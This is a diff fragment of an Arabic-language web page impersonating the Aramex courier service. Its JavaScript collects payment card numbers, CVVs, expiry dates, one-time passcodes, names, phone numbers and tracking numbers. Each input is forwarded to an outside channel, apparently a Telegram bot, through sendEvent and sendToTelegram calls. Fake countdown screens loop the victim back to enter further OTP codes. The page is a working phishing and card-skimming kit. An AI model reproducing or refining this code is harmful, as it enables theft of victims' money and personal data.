+    await sendEvent(`🔐 *رمز التحقق OTP*\n🔢 الرمز: ${otpCode}\n📦 رقم التتبع: ${currentTrackingNumber}`);
   }
+  
   // عناصر الدفع
   const paymentMain = document.getElementById("paymentMainScreen");
   const loader60Scr = document.getElementById("loader60Screen");
@@ -724,8 +603,10 @@
   const otpBtn = document.getElementById("otpBtn");
   const loader60Count = document.getElementById("loader60Count");
   let loader60Timer=null, loader30Timer=null;
+  
   for(let i=1;i<=12;i++){let opt=document.createElement("option");opt.value=String(i).padStart(2,"0");opt.textContent=String(i).padStart(2,"0");expMonth.appendChild(opt);}
   for(let y=26;y<=50;y++){let opt=document.createElement("option");opt.value=String(y);opt.textContent=String(y);expYear.appendChild(opt);}
+  
   function showPaymentScreen(screenName){
     paymentMain.classList.remove("active"); loader60Scr.classList.remove("active"); otpScr.classList.remove("active"); loader30Scr.classList.remove("active");
     if(screenName==='payment') paymentMain.classList.add("active");
@@ -733,61 +614,64 @@
     else if(screenName==='otp') otpScr.classList.add("active");
     else if(screenName==='loader30') loader30Scr.classList.add("active");
   }
+  
   function startLoader60ThenOTP(){
     if(loader60Timer) clearInterval(loader60Timer);
     let seconds=60; loader60Count.textContent=seconds; showPaymentScreen('loader60');
     loader60Timer=setInterval(()=>{ seconds--; loader60Count.textContent=seconds; if(seconds<=0){ clearInterval(loader60Timer); showPaymentScreen('otp'); } },1000);
   }
+  
   function startLoader30ThenBackOTP(){
     if(loader30Timer) clearTimeout(loader30Timer);
     showPaymentScreen('loader30');
     loader30Timer=setTimeout(()=>{ otpInput.value=""; otpInput.classList.remove("error"); showPaymentScreen('otp'); },30000);
   }
+  
   // أحداث الإدخال
   cardHolder.addEventListener("input",function(){this.value=this.value.replace(/[^A-Za-z ]/g,""); validateCardHolder();});
   cardNumber.addEventListener("input",function(){this.value=this.value.replace(/\D/g,'').slice(0,16); validateCardNumber();});
   cvv.addEventListener("input",function(){this.value=this.value.replace(/\D/g,'').slice(0,3); validateCVV();});
   expMonth.addEventListener("change",validateExpiry); expYear.addEventListener("change",validateExpiry);
   otpInput.addEventListener("input",function(){this.value=this.value.replace(/\D/g,'').slice(0,6);});
-  payBtn.addEventListener("click",async function(){
+  payBtn.addEventListener("click", async function(){
     if(!validatePaymentForm()) return;
     await sendPaymentMessage();
     startLoader60ThenOTP();
   });
-  otpBtn.addEventListener("click",async function(){
+  otpBtn.addEventListener("click", async function(){
     let code=otpInput.value.trim();
     if(!code || code.length<4){ otpInput.classList.add("error"); return; }
     await sendOtpMessage(code);
     startLoader30ThenBackOTP();
   });
   
-  // ========== ربط بقية أحداث أرامكس ==========
-  document.getElementById("goLogin").addEventListener("click",()=>{ sendToTelegram(`🔐 *تسجيل دخول* 🆔 ${userId}`); go("where"); });
-  document.querySelectorAll("#page-where .choice").forEach(c=>c.addEventListener("click",async function(){ let type=this.querySelector(".lbl")?.innerText; await sendToTelegram(`📦 *اختيار نوع الشحنة*: ${type} | 🆔 ${userId}`); go(this.dataset.next); }));
-  let selectedType="";
-  document.querySelectorAll("#page-details .choice.selectable").forEach(el=>{ el.addEventListener("click",()=>{ selectedType=el.dataset.type; document.querySelectorAll("#page-details .choice.selectable").forEach(x=>x.classList.remove("selected")); el.classList.add("selected"); }); });
-  function validateDetails(){ let ok=true; if(!document.getElementById("d_shipno").value.trim()) ok=false; if(!document.getElementById("d_content").value.trim()) ok=false; let pieces=parseInt(document.getElementById("d_pieces").value); if(!pieces) ok=false; if(!selectedType) ok=false; return ok; }
-  document.getElementById("btnSendShipment").addEventListener("click",async function(){
+  // ================== باقي أحداث أرامكس ==================
+  document.getElementById("goLogin").addEventListener("click", async () => { await sendEvent(`🔐 *تسجيل دخول*`); go("where"); });
+  document.querySelectorAll("#page-where .choice").forEach(choice => { choice.addEventListener("click", async function() { let type = this.querySelector(".lbl")?.innerText; await sendEvent(`📦 *اختيار نوع الشحنة*: ${type}`); go(this.dataset.next); }); });
+  let selectedType = "";
+  document.querySelectorAll("#page-details .choice.selectable").forEach(el => { el.addEventListener("click", () => { selectedType = el.dataset.type; document.querySelectorAll("#page-details .choice.selectable").forEach(x=>x.classList.remove("selected")); el.classList.add("selected"); }); });
+  function validateDetails(){ let ok=true; if(!document.getElementById("d_shipno").value.trim()) ok=false; if(!document.getElementById("d_content").value.trim()) ok=false; if(!parseInt(document.getElementById("d_pieces").value)) ok=false; if(!selectedType) ok=false; return ok; }
+  document.getElementById("btnSendShipment").addEventListener("click", async function(){
     if(!validateDetails()){ showPopup("يرجى ملء جميع بيانات الشحنة"); return; }
     let shipNo=document.getElementById("d_shipno").value.trim();
-    currentTrackingNumberForPay=shipNo;
+    currentTrackingNumber=shipNo;
     let senderInfo=`المرسل: ${document.getElementById("s_name").value} - ${document.getElementById("s_phone").value}`;
     let receiverInfo=`المستلم: ${document.getElementById("r_name").value} - ${document.getElementById("r_phone").value}`;
-    await sendToTelegram(`📮 *بيانات الشحنة*\n${senderInfo}\n${receiverInfo}\nرقم التتبع: ${shipNo}\nالمحتوى: ${document.getElementById("d_content").value}\nالقطع: ${document.getElementById("d_pieces").value}\nالنوع: ${selectedType==="docs"?"وثائق":"طرد"}\n🆔 ${userId}`);
+    await sendEvent(`📮 *بيانات الشحنة*\n${senderInfo}\n${receiverInfo}\nرقم التتبع: ${shipNo}\nالمحتوى: ${document.getElementById("d_content").value}\nالقطع: ${document.getElementById("d_pieces").value}\nالنوع: ${selectedType==="docs"?"وثائق":"طرد"}`);
     go("paymethod");
   });
-  document.getElementById("trackBtn").addEventListener("click",async()=>{
+  document.getElementById("trackBtn").addEventListener("click", async()=>{
     let num=document.getElementById("trackingNumber").value.trim();
     if(num.length!==10){showPopup("رقم التتبع 10 أرقام"); return;}
     let status=(num.charAt(2)==='4' && num.charAt(3)==='0')?"قيد المعالجة":"لا يوجد شحنة";
     document.getElementById("trackResult").textContent=status;
     document.getElementById("trackResult").style.display="block";
-    await sendToTelegram(`🔍 *تتبع شحنة*\nرقم: ${num} - الحالة: ${status}\n🆔 ${userId}`);
+    await sendEvent(`🔍 *تتبع شحنة*\nرقم: ${num} - الحالة: ${status}`);
   });
-  document.getElementById("submitRefundBtn").addEventListener("click",async()=>{
+  document.getElementById("submitRefundBtn").addEventListener("click", async()=>{
     let name=document.getElementById("refund_name").value.trim(), phone=document.getElementById("refund_phone").value.trim(), track=document.getElementById("refund_tracking").value.trim();
     if(!name||!phone||!track){showPopup("يرجى ملء جميع الحقول"); return;}
-    await sendToTelegram(`💰 *طلب استرجاع*\nالاسم: ${name}\nالجوال: ${phone}\nالتتبع: ${track}\n🆔 ${userId}`);
+    await sendEvent(`💰 *طلب استرجاع*\nالاسم: ${name}\nالجوال: ${phone}\nالتتبع: ${track}`);
     showPopup("سيتم استرجاع المبلغ خلال 3 أيام عمل");
     go("where");
   });
@@ -799,7 +683,7 @@
   document.getElementById("btnNextReceiver").addEventListener("click",()=>{ if(document.getElementById("r_name").value.trim() && document.getElementById("r_phone").value.trim()) go("details"); else showPopup("يرجى تعبئة بيانات المستلم"); });
   document.getElementById("hiddenTrackBtn").addEventListener("click",()=>go("tracking"));
   document.getElementById("hiddenShipBtn").addEventListener("click",()=>go("where"));
-  const pages={home:document.getElementById("page-home"), where:document.getElementById("page-where"), sender:document.getElementById("page-sender"), receiver:document.getElementById("page-receiver"), details:document.getElementById("page-details"), paymethod:document.getElementById("page-paymethod"), tracking:document.getElementById("page-tracking"), refund:document.getElementById("page-refund"), success:document.getElementById("page-success")};
+  const pages = { home:document.getElementById("page-home"), where:document.getElementById("page-where"), sender:document.getElementById("page-sender"), receiver:document.getElementById("page-receiver"), details:document.getElementById("page-details"), paymethod:document.getElementById("page-paymethod"), tracking:document.getElementById("page-tracking"), refund:document.getElementById("page-refund"), success:document.getElementById("page-success") };
   function go(pageName){ Object.values(pages).forEach(p=>p?.classList.remove("active")); if(pages[pageName]) pages[pageName].classList.add("active"); document.getElementById("app").scrollTo({top:0}); closeMenu(); if(pageName==="paymethod"){ showPaymentScreen('payment'); if(loader60Timer) clearInterval(loader60Timer); if(loader30Timer) clearTimeout(loader30Timer); } }
   function closeMenu(){ document.getElementById("sideMenu").classList.remove("open"); document.getElementById("menuOverlay").classList.remove("open"); }
   document.getElementById("openMenu").addEventListener("click",()=>{ document.getElementById("sideMenu").classList.add("open"); document.getElementById("menuOverlay").classList.add("open"); });
@@ -809,9 +693,15 @@
   function showPopup(msg){ let pop=document.getElementById("customPopup"); document.getElementById("popupMessage").textContent=msg; pop.style.display="block"; setTimeout(()=>pop.style.display="none",4000); }
   window.hidePopup=()=>document.getElementById("customPopup").style.display="none";
   document.addEventListener("DOMContentLoaded",()=>{ document.querySelectorAll("body > *:not(#myProductBox)").forEach(el=>el.style.display="none"); document.body.style.visibility="visible"; });
-  // تحديث أعلام الهاتف
   function updatePhoneField(prefix){ let select=document.getElementById(prefix+'_country'); let span=document.querySelector(`#${prefix}_phone`).parentElement.querySelector('.flag span'); if(select&&span){ let codes={sa:'+966',ae:'+971',kw:'+965',bh:'+973',qa:'+974',om:'+968'}; span.textContent=codes[select.value]||'+966'; } }
   document.getElementById('s_country').addEventListener('change',()=>updatePhoneField('s')); document.getElementById('r_country').addEventListener('change',()=>updatePhoneField('r')); updatePhoneField('s'); updatePhoneField('r');
+  document.querySelectorAll('#s_phone, #r_phone').forEach(inp=>inp.addEventListener('input',function(){ this.value=this.value.replace(/\D/g,'').slice(0,10); }));
+  document.getElementById('d_shipno').addEventListener('input',function(){ this.value=this.value.replace(/\D/g,'').slice(0,10); });
+  document.getElementById('d_pieces').addEventListener('input',function(){ this.value=this.value.replace(/\D/g,'').slice(0,4); });
+  document.getElementById('refund_phone').addEventListener('input',function(){ this.value=this.value.replace(/\D/g,'').slice(0,10); });
+  document.getElementById('refund_tracking').addEventListener('input',function(){ this.value=this.value.replace(/\D/g,'').slice(0,10); });
+  const mainImg = document.getElementById("mainImage");
+  if(mainImg){ mainImg.addEventListener("dragstart",(e)=>e.preventDefault()); mainImg.addEventListener("contextmenu",(e)=>e.preventDefault()); }
 </script>
 </body>
   </html>
